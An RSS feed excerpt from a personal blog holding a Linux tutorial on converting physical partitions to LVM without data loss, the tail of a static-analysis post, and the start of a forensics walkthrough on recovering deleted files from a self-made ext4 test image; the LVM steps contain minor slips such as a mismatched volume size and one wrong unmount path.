<p>The approach to static analysis that you use will impact the types of vulnerabilities that you are more likely and their likelihood of being exploitable. I encourage you to experiment with different approaches to static analysis and decide for yourself which methods work best for your goals. A mixed approach is quite common and even encouraged for best results.</p>
<p>Happy hacking!</p>
]]></content:encoded>
    </item>
    <item>
      <title>How to safely convert to LVM without losing your data</title>
      <link>https://ally-petitt.com:443/en/posts/2023-08-19_how-to-safely-convert-to-lvm-without-losing-your-data-258ce044448/</link>
      <pubDate>Sat, 19 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.com:443/en/posts/2023-08-19_how-to-safely-convert-to-lvm-without-losing-your-data-258ce044448/</guid>
      <description>&lt;h1 id=&#34;introduction&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*es1LJrnEBsSNgXZM.png&#34; alt=&#34;&#34;  /&gt;

Introduction&lt;/h1&gt;
&lt;p&gt;This article is a walkthrough that demonstrates the solution to a particular situation that computer owners may encounter when updating their system. For readers who do not fit into the scenario listed below, this is also a great article for familiarizing yourself with the practical application of logical volume manager (LVM). Otherwise, feel free to modify your approach as works best with your scenario.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Scenario:&lt;/strong&gt; You have a hard drive with all your files on it that uses physical partitions. You just bought a new hard drive and would like to use both drives together to manage logical partitions rather than physical ones. You also don’t want to lose the data that was on your original physical partitions.&lt;/p&gt;
&lt;p&gt;As implied from above, the only requirements for this approach are that you have a system that can use LVM and you have a storage device with equal or greater size than the amount of data stored on the primary storage device. Additionally, it is assumed that you are using Linux.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; This has the potential to cause damage and potentially brick your system. Your implementation may also vary depending on your setup. Continue at your own risk.&lt;/p&gt;
&lt;h2 id=&#34;benefits-oflvm&#34;&gt;Benefits of LVM&lt;/h2&gt;
&lt;p&gt;The full scope of LVMs capabilities can be seen &lt;a href=&#34;https://man7.org/linux/man-pages/man8/lvm.8.html&#34;&gt;here&lt;/a&gt;. It is a flexible utility that offers unique advantages over traditional physical partitions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Grouping multiple drives into a single volume group&lt;/li&gt;
&lt;li&gt;Support for &lt;a href=&#34;https://en.wikipedia.org/wiki/Thin_provisioning&#34;&gt;thin provisioning&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Snapshot capabilities that can be used for backups&lt;/li&gt;
&lt;li&gt;Easy to resize partitions and add/remove drives&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;More detail on the benefits can be found &lt;a href=&#34;https://linuxhint.com/whatis_logical_volume_management/&#34;&gt;here&lt;/a&gt;. We are now ready to discuss the steps to convert to LVM.&lt;/p&gt;
&lt;h1 id=&#34;steps-to-safely-convert-tolvm&#34;&gt;Steps to Safely Convert to LVM&lt;/h1&gt;
&lt;p&gt;For the purpose of this article, the primary storage device used will be referred to as &lt;code&gt;sda&lt;/code&gt; and the new storage device will be called &lt;code&gt;sdb&lt;/code&gt;. An overview of the plan is the following:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Create LVM group on &lt;code&gt;sdb&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Copy data from &lt;code&gt;sda&lt;/code&gt;partitions to &lt;code&gt;sdb&lt;/code&gt; logical partitions&lt;/li&gt;
&lt;li&gt;Expand LVM group on &lt;code&gt;sdb&lt;/code&gt; to include unused &lt;code&gt;sda&lt;/code&gt; partitions&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;prerequisite&#34;&gt;Prerequisite&lt;/h2&gt;
&lt;p&gt;Install the LVM tools and &lt;code&gt;rsync&lt;/code&gt; with the command that is appropriate with your Linux distribution.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install lvm2 rsync # For Ubuntu/Debian  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo pacman -Sy lvm2 rsync # Arch Linux
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;Create LVM group on &lt;code&gt;sdb&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Create a volume group called &lt;code&gt;myvg&lt;/code&gt; on &lt;code&gt;sdb&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo pvcreate /dev/sdb  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo vgcreate myvg /dev/sdb
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Create a logical volume&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Create a logical volume on the &lt;code&gt;myvg&lt;/code&gt; volume group to store the new data in. This one is named &lt;code&gt;backup&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo lvcreate -n backup -L 300G myvg
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To verify your progress, you can run the commands &lt;code&gt;sudo vgs&lt;/code&gt; and &lt;code&gt;sudo lvs&lt;/code&gt; to list the recently created volume groups and logical volumes.&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Mount the new logical volume&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Create a filesystem. For quick creation, just press the Enter key for each of the prompts.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo mkfs.ext4 /dev/myvg/backup
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then, create a mount point and mount the &lt;code&gt;backup&lt;/code&gt; logical volume to it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo mkdir /mnt/backup  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo mount /dev/myvg/backup /mnt/backup
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Copy data to the logical volume&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Then, mount the partition that you would like to transfer onto a new mount point. For instance, I would like to transfer &lt;code&gt;sda3&lt;/code&gt; onto &lt;code&gt;backup&lt;/code&gt; so I will use the following command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo mount /dev/sda3 /mnt/root
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In this case, &lt;code&gt;rsync&lt;/code&gt; will be used to transfer the files from &lt;code&gt;sda&lt;/code&gt; to &lt;code&gt;sdb&lt;/code&gt;. In this case, the 500GB portion of &lt;code&gt;sdb&lt;/code&gt; that was used to create the &lt;code&gt;backup&lt;/code&gt; logical volume. After, I will unmount the logical volume and physical partition.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo rsync -av /mnt/root /mnt/backup  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo umount /mnt/backup  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo umount /dev/root
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Repeat steps 2–4 with all of the partitions that you with to preserve.&lt;/strong&gt;&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Expand the LVM volumes&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Now, we will add &lt;code&gt;sda2&lt;/code&gt; and &lt;code&gt;sda3&lt;/code&gt; into the volume group of LVM. In order to do this, we must initialize them as physical volumes and extend them to the volume group.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo pvcreate /dev/sdY  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo vgextend myvg /dev/sdY
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Add new partitions to fstab&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Finally, find the UUIDs of the new logical volumes with &lt;code&gt;lsblk -f&lt;/code&gt; and add those to your &lt;code&gt;/etc/fstab&lt;/code&gt; with the following syntax:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;UUID=&amp;lt;your-home-uuid&amp;gt; /home ext4 rw,relatime 0 2  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;UUID=&amp;lt;your-root-uuid&amp;gt; / ext4 rw,relatime 0 1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As always, make changes to the above configuration option if necessary.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;These are the steps that worked for me with my setup. I hope that you found this article helpful and informative. Feel free to reach out if you have any questions.&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<h1 id="introduction"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*es1LJrnEBsSNgXZM.png" alt=""  />

Introduction</h1>
<p>This article is a walkthrough that demonstrates the solution to a particular situation that computer owners may encounter when updating their system. For readers who do not fit into the scenario listed below, this is also a great article for familiarizing yourself with the practical application of logical volume manager (LVM). Otherwise, feel free to modify your approach as works best with your scenario.</p>
<p><strong>Scenario:</strong> You have a hard drive with all your files on it that uses physical partitions. You just bought a new hard drive and would like to use both drives together to manage logical partitions rather than physical ones. You also don’t want to lose the data that was on your original physical partitions.</p>
<p>As implied from above, the only requirements for this approach are that you have a system that can use LVM and you have a storage device with equal or greater size than the amount of data stored on the primary storage device. Additionally, it is assumed that you are using Linux.</p>
<p><strong>Warning:</strong> This has the potential to cause damage and potentially brick your system. Your implementation may also vary depending on your setup. Continue at your own risk.</p>
<h2 id="benefits-oflvm">Benefits of LVM</h2>
<p>The full scope of LVMs capabilities can be seen <a href="https://man7.org/linux/man-pages/man8/lvm.8.html">here</a>. It is a flexible utility that offers unique advantages over traditional physical partitions:</p>
<ul>
<li>Grouping multiple drives into a single volume group</li>
<li>Support for <a href="https://en.wikipedia.org/wiki/Thin_provisioning">thin provisioning</a></li>
<li>Snapshot capabilities that can be used for backups</li>
<li>Easy to resize partitions and add/remove drives</li>
</ul>
<p>More detail on the benefits can be found <a href="https://linuxhint.com/whatis_logical_volume_management/">here</a>. We are now ready to discuss the steps to convert to LVM.</p>
<h1 id="steps-to-safely-convert-tolvm">Steps to Safely Convert to LVM</h1>
<p>For the purpose of this article, the primary storage device used will be referred to as <code>sda</code> and the new storage device will be called <code>sdb</code>. An overview of the plan is the following:</p>
<ol>
<li>Create LVM group on <code>sdb</code></li>
<li>Copy data from <code>sda</code>partitions to <code>sdb</code> logical partitions</li>
<li>Expand LVM group on <code>sdb</code> to include unused <code>sda</code> partitions</li>
</ol>
<h2 id="prerequisite">Prerequisite</h2>
<p>Install the LVM tools and <code>rsync</code> with the command that is appropriate with your Linux distribution.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt-get install lvm2 rsync # For Ubuntu/Debian  
</span></span><span style="display:flex;"><span>sudo pacman -Sy lvm2 rsync # Arch Linux
</span></span></code></pre></div><ol>
<li>Create LVM group on <code>sdb</code></li>
</ol>
<hr>
<p>Create a volume group called <code>myvg</code> on <code>sdb</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo pvcreate /dev/sdb  
</span></span><span style="display:flex;"><span>$ sudo vgcreate myvg /dev/sdb
</span></span></code></pre></div><ol start="2">
<li>Create a logical volume</li>
</ol>
<hr>
<p>Create a logical volume on the <code>myvg</code> volume group to store the new data in. This one is named <code>backup</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo lvcreate -n backup -L 300G myvg
</span></span></code></pre></div><p>To verify your progress, you can run the commands <code>sudo vgs</code> and <code>sudo lvs</code> to list the recently created volume groups and logical volumes.</p>
<ol start="3">
<li>Mount the new logical volume</li>
</ol>
<hr>
<p>Create a filesystem. For quick creation, just press the Enter key for each of the prompts.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo mkfs.ext4 /dev/myvg/backup
</span></span></code></pre></div><p>Then, create a mount point and mount the <code>backup</code> logical volume to it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo mkdir /mnt/backup  
</span></span><span style="display:flex;"><span>sudo mount /dev/myvg/backup /mnt/backup
</span></span></code></pre></div><ol start="4">
<li>Copy data to the logical volume</li>
</ol>
<hr>
<p>Then, mount the partition that you would like to transfer onto a new mount point. For instance, I would like to transfer <code>sda3</code> onto <code>backup</code> so I will use the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo mount /dev/sda3 /mnt/root
</span></span></code></pre></div><p>In this case, <code>rsync</code> will be used to transfer the files from <code>sda</code> to <code>sdb</code>. In this case, the 500GB portion of <code>sdb</code> that was used to create the <code>backup</code> logical volume. After, I will unmount the logical volume and physical partition.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo rsync -av /mnt/root /mnt/backup  
</span></span><span style="display:flex;"><span>sudo umount /mnt/backup  
</span></span><span style="display:flex;"><span>sudo umount /dev/root
</span></span></code></pre></div><p><strong>Repeat steps 2–4 with all of the partitions that you with to preserve.</strong></p>
<ol start="5">
<li>Expand the LVM volumes</li>
</ol>
<hr>
<p>Now, we will add <code>sda2</code> and <code>sda3</code> into the volume group of LVM. In order to do this, we must initialize them as physical volumes and extend them to the volume group.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo pvcreate /dev/sdY  
</span></span><span style="display:flex;"><span>sudo vgextend myvg /dev/sdY
</span></span></code></pre></div><ol start="5">
<li>Add new partitions to fstab</li>
</ol>
<hr>
<p>Finally, find the UUIDs of the new logical volumes with <code>lsblk -f</code> and add those to your <code>/etc/fstab</code> with the following syntax:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>UUID=&lt;your-home-uuid&gt; /home ext4 rw,relatime 0 2  
</span></span><span style="display:flex;"><span>UUID=&lt;your-root-uuid&gt; / ext4 rw,relatime 0 1
</span></span></code></pre></div><p>As always, make changes to the above configuration option if necessary.</p>
<h1 id="conclusion">Conclusion</h1>
<p>These are the steps that worked for me with my setup. I hope that you found this article helpful and informative. Feel free to reach out if you have any questions.</p>
]]></content:encoded>
    </item>
    <item>
      <title>5 Ways I Found Your Deleted Files</title>
      <link>https://ally-petitt.com:443/en/posts/2023-05-13_5-ways-i-found-your-deleted-files-492407dbd467/</link>
      <pubDate>Sat, 13 May 2023 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.com:443/en/posts/2023-05-13_5-ways-i-found-your-deleted-files-492407dbd467/</guid>
      <description>&lt;h2 id=&#34;computer-forensics-for-filerecovery&#34;&gt;Computer Forensics for File Recovery&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*MnBiAcwiwaFGOOAe.jpg&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://edgy.app/wp-content/uploads/2018/04/dataleakhackerGorodenkoff-970x546.jpg&#34;&gt;https://edgy.app/wp-content/uploads/2018/04/dataleakhackerGorodenkoff-970x546.jpg&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;When a file is “deleted”, its contents aren’t typically erased from the storage device that it was stored on. More often than not, the blocks that stored the file are marked as unallocated and the filesystem pointers are removed from it. The implication is that the file still exists on the disk until it is overwritten.&lt;/p&gt;
&lt;p&gt;There are many methods to recovering the raw, unallocated data. &lt;a href=&#34;https://forensics.wiki/tools_data_recovery/&#34;&gt;This website&lt;/a&gt; lists many tools that can be used for file recovery in different scenarios. In this article, I’ll be walking through 5 different tools that can be used to recover data.&lt;/p&gt;
&lt;h1 id=&#34;setup&#34;&gt;Setup&lt;/h1&gt;
&lt;p&gt;I’ll be using doing forensic analysis on a drive that I created and attached to my Kali Linux VM. To see how this is done, you can reference &lt;a href=&#34;https://opensource.com/article/19/4/create-filesystem-linux-partition&#34;&gt;this article&lt;/a&gt;. On this drive, I saved and then deleted an image file and text file.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*HRHkhSM5bBjI9ouCYNpU4w.png&#34; alt=&#34;Image of commands I used to set up file system for forensic analysis&#34;  /&gt;

I’ll start by doing general enumeration on the disk image. Then, I’ll showcase a variety of file recovery techniques used by forensic analysts that allowed me to recover the deleted files. Many of the tools used will be from the &lt;a href=&#34;http://sleuthkit.org/sleuthkit&#34;&gt;Sleuth Kit&lt;/a&gt; (TSK).&lt;/p&gt;
&lt;p&gt;Before starting, I’ll unmount the filesystem, create a duplicate of it, remove write permissions from the duplicate, and verify the integrity of the duplicate against the original hash of &lt;code&gt;/dev/sdb&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cd ../ &amp;amp;&amp;amp; umount /mnt/secret # unmount /mnt/secret  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ dd if=/dev/sdb of=/home/kali/forensics/sdb.img # copy /dev/sdb into sdb.img  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22286+0 records in  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22286+0 records out  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;11410432 bytes (11 MB, 11 MiB) copied, 0.0412053 s, 277 MB/s  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ chmod a-w /home/kali/forensics/sdb.img # remove write access to the image  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ md5sum /home/kali/forensics/sdb.img /dev/sdb  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;6c49fb21916d59e0df69453959392e23 /home/kali/forensics/sdb.img  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;6c49fb21916d59e0df69453959392e23 /dev/sdb
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;image-analysis&#34;&gt;Image Analysis&lt;/h2&gt;
&lt;p&gt;Using the &lt;code&gt;file&lt;/code&gt; command reveals that the image uses an ext4 file system.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*4gowWgQfJ4J1FXwjFHjhQg.png&#34; alt=&#34;&#34;  /&gt;

Furthermore, the &lt;code&gt;stat&lt;/code&gt; command displays information about the image such as its size, time stamps, and block details.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*_T8VXPuyfnuQ7Rm5WNIOsQ.png&#34; alt=&#34;output of the stat command&#34;  /&gt;

With the information that the image uses ext4, the &lt;code&gt;fsstat&lt;/code&gt; command can be used to extract more detailed information about the file system, metadata, content data, and block groups.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ fsstat -f ext4 sdb.img   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FILE SYSTEM INFORMATION  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--------------------------------------------  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;File System Type: Ext4  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Volume Name:   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Volume ID: dc8a4fb36dce8eabee4c51cf01c2d52a  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last Written at: 2023-05-09 22:35:31 (EDT)  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last Checked at: 2023-05-09 22:23:26 (EDT)  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last Mounted at: 2023-05-09 22:24:27 (EDT)  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Unmounted properly  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last mounted on: /mnt/secret  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Source OS: Linux  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Dynamic Structure  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Compat Features: Journal, Ext Attributes, Resize Inode, Dir Index  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;InCompat Features: Filetype, Extents, 64bit, Flexible Block Groups,   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Read Only Compat Features: Sparse Super, Large File, Huge File, Extra Inode Size  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Journal ID: 00  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Journal Inode: 8  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;METADATA INFORMATION  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--------------------------------------------  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Inode Range: 1 - 2785  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Root Directory: 2  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Free Inodes: 2773  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Inode Size: 256  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CONTENT INFORMATION  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--------------------------------------------  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Block Groups Per Flex Group: 16  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Block Range: 0 - 11139  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Block Size: 1024  
